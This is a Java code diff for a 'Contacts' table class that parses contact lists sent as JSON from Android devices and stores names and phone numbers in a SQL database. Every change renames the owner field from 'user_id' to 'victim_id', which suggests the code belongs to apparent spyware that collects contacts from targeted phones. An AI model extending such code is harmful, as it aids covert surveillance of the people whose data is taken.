@@ -21,7 +21,7 @@ public class Contacts extends BaseTable<Contact> {
 
     private static final String COLUMN_PHONE_NUMBER = "phone_number";
     private static final String COLUMN_PHONE_TYPE = "phone_type";
-    private static final String COLUMN_USER_ID = "user_id";
+    private static final String COLUMN_VICTIM_ID = "victim_id";
     private static final String KEY_PHONE_NUMBERS = "phone_numbers";
     private static final String COLUMN_ANDROID_CONTACT_ID = "android_contact_id";
     private static final String TABLE_NAME_CONTACTS = "contacts";
@@ -67,7 +67,7 @@ public class Contacts extends BaseTable<Contact> {
     }
 
     @Override
-    protected List<Contact> parse(@Nullable String userId, @NotNull JSONArray jaContacts) throws JSONException {
+    protected List<Contact> parse(@Nullable String victimId, @NotNull JSONArray jaContacts) throws JSONException {
 
         final List<Contact> contactList = new ArrayList<>();
 
@@ -80,7 +80,7 @@ public class Contacts extends BaseTable<Contact> {
 
             final JSONArray jaPhoneNumbers = joContact.getJSONArray(KEY_PHONE_NUMBERS);
             final List<Contact.PhoneNumber> phoneNumbers = parsePhoneNumbers(null, jaPhoneNumbers);
-            contactList.add(new Contact(userId, androidContactId, null, name, phoneNumbers));
+            contactList.add(new Contact(victimId, androidContactId, null, name, phoneNumbers));
 
         }
 
@@ -152,30 +152,30 @@ public class Contacts extends BaseTable<Contact> {
     /**
      * Adding contacts from JSONArray
      *
-     * @param userId
+     * @param victimId
      * @param jsonArray
      * @throws RuntimeException
      * @throws JSONException
      */
     @Override
-    public void addv2(@Nullable String userId, @NotNull JSONArray jsonArray) throws RuntimeException, JSONException {
+    public void addv2(@Nullable String victimId, @NotNull JSONArray jsonArray) throws RuntimeException, JSONException {
 
         boolean isAdded = true;
         //Preparing list
-        final List<Contact> contactList = parse(userId, jsonArray);
+        final List<Contact> contactList = parse(victimId, jsonArray);
 
-        final String insertContactQuery = "INSERT INTO contacts (user_id,android_contact_id, name) VALUES (?,?,?);";
+        final String insertContactQuery = "INSERT INTO contacts (victim_id,android_contact_id, name) VALUES (?,?,?);";
 
         final java.sql.Connection con = Connection.getConnection();
 
         try {
             final PreparedStatement psAddContact = con.prepareStatement(insertContactQuery, PreparedStatement.RETURN_GENERATED_KEYS);
-            psAddContact.setString(1, userId);
+            psAddContact.setString(1, victimId);
 
             for (final Contact contact : contactList) {
 
                 String contactId = null;
-                final Contact exContact = get(Contacts.COLUMN_USER_ID, userId, Contacts.COLUMN_ANDROID_CONTACT_ID, contact.getAndroidContactId());
+                final Contact exContact = get(Contacts.COLUMN_VICTIM_ID, victimId, Contacts.COLUMN_ANDROID_CONTACT_ID, contact.getAndroidContactId());
 
                 if (exContact == null) {
 
